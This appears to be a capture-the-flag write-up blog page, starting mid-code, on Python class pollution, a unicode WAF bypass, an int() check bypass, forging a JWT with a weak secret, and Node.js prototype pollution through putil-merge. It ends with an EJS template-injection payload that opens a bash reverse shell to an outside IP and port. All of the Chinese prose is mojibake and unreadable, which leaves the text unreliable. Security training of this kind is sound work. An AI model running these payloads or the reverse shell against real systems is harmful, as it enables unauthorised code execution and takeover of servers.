ä¸€ä¸ªVIPå§,å˜»å˜»&lt;/p&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;å…ˆç™»å½•å»&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;8888&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>è€ƒå¯ŸåŸå‹é“¾æ±¡æŸ“å’Œpythonçš„intå‡½æ•°æ¼æ´ï¼Œå…¶å®intä¸æ­¢åœ¨pythoné‡Œæœ‰è¿™ä¸ªæ¼æ´ï¼Œå…¶ä»–è¯­è¨€ä¹Ÿæœ‰ï¼Œæ¯”å¦‚phpä¹Ÿæœ‰ï¼›</p>
<p>æ ‡å¿—ç€åŸå‹é“¾æ±¡æŸ“</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶ä»£ç ä¸€å…±æœ‰100å¤šè¡Œï¼Œä½†æ˜¯æ•´ä¸ªä»£ç çš„é€»è¾‘å’Œå®ç°çš„åŠŸèƒ½æ˜¯éå¸¸ç®€å•æ˜“æ‡‚çš„</p>
<p>ä½¿å¾—hhhç±»çš„isvipä¸ºçœŸï¼Œä½†æ˜¯hhhæ²¡æœ‰isvipå±æ€§ï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯éœ€è¦æ±¡æŸ“hhhç±»ï¼Œ</p>
<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>å…ˆçœ‹ä¸€ä¸ªpythonåŸå‹é“¾æ±¡æŸ“çš„ç®€å•æ¡ˆä¾‹å§</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;no way&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#haha</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#haha</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#no way</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#no way</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="pollute"><a href="#pollute" class="headerlink" title="pollute"></a>pollute</h3><p>ç„¶åä¸‹é¢æ˜¯æˆ‘è‡ªå·±æœ¬åœ°æµ‹è¯•çš„ç»“æœ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;aa&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;bb&quot;</span></span><br><span class="line">        self.isvip=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hhh</span>(<span class="title class_ inherited__">User</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;cc&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;dd&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user = hhh()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;username&quot;: &quot;test&quot;,</span></span><br><span class="line"><span class="string">&quot;password&quot;: &quot;test002&quot;,</span></span><br><span class="line"><span class="string">&quot;\u0069\u0073\u0076\u0069\u0070&quot; : &quot;111&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = json.loads(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(user.username)</span><br><span class="line"><span class="built_in">print</span>(user.password)</span><br><span class="line"></span><br><span class="line">merge(payload, user)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(user.username)</span><br><span class="line"><span class="built_in">print</span>(user.password)</span><br><span class="line"><span class="built_in">print</span>(user.isvip)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨unicodeç¼–ç ç»•è¿‡wafï¼Œjson.loadä¼šè‡ªåŠ¨è¿›è¡Œunicodeè§£ç ï¼Œ</p>
<p>ç»•åå°±æ˜¯ç»•è¿‡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">and</span> data != <span class="string">&quot;123456789&quot;</span> <span class="keyword">and</span> <span class="built_in">int</span>(data) == <span class="number">123456789</span> <span class="keyword">and</span> <span class="built_in">len</span>(data) &lt;=<span class="number">10</span>:</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ¯”è¾ƒç®€å•äº†ç”¨ç©ºæ ¼æˆ–è€…å­—ç¬¦â€œ+â€æˆ–è€…0ï¼Œè¿™é‡Œå°†0ç¦æ­¢äº†ç”¨å‰é¢ä¸¤è€…å°±è¡Œï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?=%20123456789</span><br><span class="line">æˆ–è€…</span><br><span class="line">?=+123456789</span><br></pre></td></tr></table></figure>





<h2 id="é›¨"><a href="#é›¨" class="headerlink" title="é›¨"></a>é›¨</h2><p>æ ¹æ®hint secret_keyæ˜¯å‡ºé¢˜äººçš„id:VanZY(æˆ‘å½“æ—¶æ²¡çœ‹hintï¼Œç”¨è„šæœ¬ä¹Ÿå¯ä»¥çˆ†ç ´å‡ºæ¥)ï¼Œç„¶åä¼ªé€ jwtï¼Œå¾—åˆ°æºç </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt_secret = <span class="string">&quot;VanZY&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> putil_merge = <span class="built_in">require</span>(<span class="string">&quot;putil-merge&quot;</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Super</span> = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> safecode = <span class="keyword">function</span> (<span class="params">code</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> validInput = <span class="regexp">/global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\+|\*/ig</span>;</span><br><span class="line">    <span class="keyword">return</span> !validInput.<span class="title function_">test</span>(code);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/code&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span> &amp;&amp; req.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="title function_">putil_merge</span>(&#123;&#125;, req.<span class="property">body</span>, &#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&quot;welcome to code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/hint&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;I heard that the challenge maker likes to use his own id as secret_key&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">  jwt.<span class="title function_">verify</span>(auth, jwt_secret , <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname + <span class="string">&#x27;/index.js&#x27;</span>));</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin    &lt;!--Maybe you can view /hint--&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;Fuck you Hacker!!!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/create&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">body</span>.<span class="property">name</span> || req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">null</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;please input name&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Super</span>[<span class="string">&#x27;userrole&#x27;</span>] === <span class="string">&#x27;Superadmin&#x27;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, req.<span class="property">body</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">safecode</span>(req.<span class="property">body</span>.<span class="property">name</span>)) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;ä½ åœ¨åšä»€ä¹ˆï¼Ÿå¿«åœä¸‹ï¼ï¼ï¼&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">name</span>: req.<span class="property">body</span>.<span class="property">name</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;guest&#x27;</span>&#125;,jwt_secret,&#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth &#x27;</span>,token);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Only admin can get source in /source&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server started on port 3000&#x27;</span>));</span><br></pre></td></tr></table></figure>



<p>ä»£ç æ¯”è¾ƒç®€å•ï¼Œä¸€çœ‹å°±æ˜¯éœ€è¦æŸç§æƒé™æ‰èƒ½æ‰§è¡ŒæŸäº›å‘½ä»¤ï¼ŒnodejsåŸå‹é“¾æ±¡æŸ“çš„è€å¥—è·¯äº†</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title class_">Super</span>[<span class="string">&#x27;userrole&#x27;</span>] === <span class="string">&#x27;Superadmin&#x27;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œï¼Œéœ€è¦Super[â€˜userroleâ€™]çš„å€¼ä¸ºSuperadminï¼Œä½†æ˜¯æ•´ä¸ªä»£ç ä¹Ÿæ²¡æœ‰æ¶‰åŠåˆ°å¯ä»¥è®©Super[â€˜userroleâ€™]çš„å€¼ä¸ºSuperadminçš„åœ°æ–¹ï¼Œä½†æ˜¯å‡­ç©ºå¤šå‡ºæ¥ä¸€ä¸ªcodeè·¯ç”±ï¼Œputil_mergeå‡½æ•°å’Œmergeå‡½æ•°ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šè¿™é‡Œæœ‰é—®é¢˜äº†</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/code&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span> &amp;&amp; req.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="title function_">putil_merge</span>(&#123;&#125;, req.<span class="property">body</span>, &#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&quot;welcome to code&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šç½‘æœç´¢putil_mergeå‡½æ•°ï¼Œå‘ç°ç¡®å®å­˜åœ¨åŸå‹é“¾æ±¡æŸ“</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> putil_merge = <span class="built_in">require</span>(<span class="string">&#x27;putil-merge&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> payload = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;polluted&quot;: &quot;yes&quot;&#125;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before:&quot;</span> + &#123;&#125;.<span class="property">polluted</span>)</span><br><span class="line"><span class="title function_">putil_merge</span>(obj, payload, &#123; <span class="attr">deep</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After:&quot;</span> + &#123;&#125;.<span class="property">polluted</span>)</span><br></pre></td></tr></table></figure>

<p>æ”¹æˆ</p>
<p>è¦æ”¹æˆapplication&#x2F;json</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET :/code</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST<span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;userrole&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Superadmin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>å°†Super[â€˜userroleâ€™]çš„å€¼æ”¹ä¸ºSuperadminï¼Œå°±æœ‰æƒé™æ‰§è¡Œï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯ä¸€ä¸ªcveï¼Œå¯ä»¥å‚è€ƒè¿™ä½<a target="_blank" rel="noopener" href="https://inhann.top/2023/03/26/ejs/">å¤§ä½¬</a></p>
<p>å½±å“ç‰ˆæœ¬ï¼šejs &lt;&#x3D; v3.1.9 ï¼ˆæœ€æ–°ç‰ˆæœ¬</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>:<span class="string">&quot;abc&quot;</span>,</span><br><span class="line">  <span class="string">&quot;settings&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;view options&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;escapeFunction&quot;</span>:<span class="string">&quot;console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).execSync(\&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5050 0&gt;&amp;1&#x27;\&quot;);&quot;</span>,</span><br><span class="line">      <span class="string">&quot;client&quot;</span>:<span class="string">&quot;true&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







